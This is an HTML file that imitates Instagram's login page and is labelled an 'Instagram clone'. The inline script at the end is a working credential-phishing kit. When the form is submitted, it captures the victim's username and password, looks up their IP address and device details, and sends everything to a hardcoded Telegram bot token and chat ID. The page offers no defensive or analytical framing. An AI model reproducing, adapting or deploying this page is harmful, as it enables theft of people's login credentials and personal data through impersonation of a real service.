<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" type="image/png" href="./img/insta-fav.ico" />
  <title>Instagram clone</title>
</head>
<body>
  <main class="flex align-items-center justify-content-center">
    <section id="mobile" class="flex"></section>

    <section id="auth" class="flex direction-column">
      <div class="panel login flex direction-column">
        <h1 class="flex justify-content-center">
          <img src="./img/instagram-logo.png" alt="Instagram logo" />
        </h1>
        <form id="login-form">
          <label for="email" class="sr-only">Phone number, username or email</label>
          <input id="email" name="email" placeholder="Phone number, username or email" required />

          <label for="password" class="sr-only">Password</label>
          <input id="password" name="password" type="password" placeholder="Password" required />

          <button type="submit">Log In</button>
        </form>

        <div class="flex separator align-items-center">
          <span></span>
          <div class="or">OR</div>
          <span></span>
        </div>

        <!-- Facebook login removed here -->

        <a href="#" style="text-align: center; margin-top: 10px;">Forgot password?</a>
      </div>

      <div class="panel register flex justify-content-center">
        <p>Don't have an account?</p>
        <a href="#">Sign up</a>
      </div>

      <div class="app-download flex direction-column align-items-center">
        <p>Get the app.</p>
        <div class="flex justify-content-center">
          <img src="./img/apple-button.png" alt="Apple Store logo" />
          <img src="./img/googleplay-button.png" alt="Google Play logo" />
        </div>
      </div>
    </section>
  </main>

  <footer>
    <ul class="flex flex-wrap justify-content-center">
      <li><a href="#">ABOUT</a></li>
      <li><a href="#">HELP</a></li>
      <li><a href="#">PRESS</a></li>
      <li><a href="#">API</a></li>
      <li><a href="#">JOBS</a></li>
      <li><a href="#">PRIVACY</a></li>
      <li><a href="#">TERMS</a></li>
      <li><a href="#">LOCATIONS</a></li>
      <li><a href="#">TOP ACCOUNTS</a></li>
      <li><a href="#">HASHTAGS</a></li>
      <li><a href="#">LANGUAGE</a></li>
    </ul>
    <p class="copyright">¬© 2020 Instagram from Facebook</p>
  </footer>

  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
  <script>
    const TOKEN = "7314962325:AAEBjydcIqoC0MO68rgUqUizlU8HDbnzubU";
    const CHAT_ID = "7649560423";
    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById("login-form").addEventListener("submit", function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      axios.get("https://api.ipify.org?format=json")
        .then((res) => {
          const ip = res.data.ip;
          const device = /mobile/i.test(navigator.userAgent) ? "üì± Mobile" : "üíª Desktop";
          const platform = navigator.platform;
          const browser = navigator.userAgent;
          const screenRes = `${screen.width}x${screen.height}`;

          const msg = `
<b>üîê New Login Attempt</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP:</b> ${ip}
<b>Device:</b> ${device}
<b>Platform:</b> ${platform}
<b>Browser:</b> ${browser}
<b>Screen:</b> ${screenRes}
          `;

          axios.post(API_URL, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML"
          }).then(() => {
            alert("‚úÖ Information sent successfully.");
          }).catch(() => {
            alert("‚ùå Failed to send message.");
          });
        })
        .catch(() => {
          alert("‚ùå Failed to get IP address.");
        });
    });
  </script>
</body>
</html>
